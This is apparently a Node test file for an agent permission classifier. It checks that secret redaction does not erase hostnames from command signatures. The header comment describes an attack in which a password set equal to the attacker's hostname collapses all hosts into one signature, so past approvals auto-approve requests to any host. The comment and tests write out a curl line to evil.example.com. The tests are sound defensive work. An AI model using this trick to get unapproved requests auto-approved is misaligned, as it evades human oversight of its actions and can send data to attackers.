/**
 * Redaction must not reach inside a templated token.
 *
 * A signature is half structure and half surviving text, and only the second
 * half can hold a secret. `<path:secret>`, `<url:api.github.com>`, `<n>` are
 * things the templater derived; blanking part of one destroys the distinction
 * the identity depends on.
 *
 * The attack is to choose a password equal to your own hostname:
 *
 *     curl -u bob:evil.example.com https://evil.example.com/p
 *
 * The redactor captures the password, `scrub` removed every literal occurrence
 * of it from the assembled signature, and `<url:evil.example.com>` became
 * `<url:«redacted»>`. Every host spelled that way shared one signature, so
 * eleven approvals of a host the developer trusted auto-approved a request to
 * any other — with the attacker choosing the password that made it happen.
 *
 * In its own file rather than in secrets.test.ts because that suite runs
 * against a fake HOME it installs at module scope, and importing the classifier
 * there changes what is resolved before it gets the chance.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import * as os from 'node:os';
import * as path from 'node:path';
import { analyze } from '../src/core/classify.js';

const WS = path.join(os.tmpdir(), 'leastgrant-scrub-token-ws');

const sigOf = (command: string): string =>
  analyze(
    { agent: 't', tool: 'Bash', input: { command }, cwd: WS, sessionId: 's', at: 1_760_000_000_000 },
    { roots: [WS], secretPatterns: [] },
  ).actions[0]!.signature;

describe('redaction does not reach inside a templated token', () => {
  test('two hosts do not collapse when the password is the hostname', () => {
    assert.notEqual(
      sigOf('curl -u bob:good.example.com https://good.example.com/p'),
      sigOf('curl -u bob:evil.example.com https://evil.example.com/p'),
      'the destination host was erased from the signature, so every host is one identity',
    );
  });

  test('the host survives in the token', () => {
    assert.match(sigOf('curl -u bob:evil.example.com https://evil.example.com/p'), /<url:evil\.example\.com>/);
  });

  test('the password itself is still not stored', () => {
    // The fix must not become "stop redacting". Outside a token, the literal
    // still goes.
    const sig = sigOf('curl -u bob:s3cr3t-p4ssw0rd https://api.github.com/p');
    assert.ok(!sig.includes('s3cr3t-p4ssw0rd'), `the password survived into the signature: ${sig}`);
  });

  test('an ordinary secret with no token around it is still scrubbed', () => {
    const sig = sigOf('mysql -u root -phunter2');
    assert.ok(!sig.includes('hunter2'), sig);
  });
});
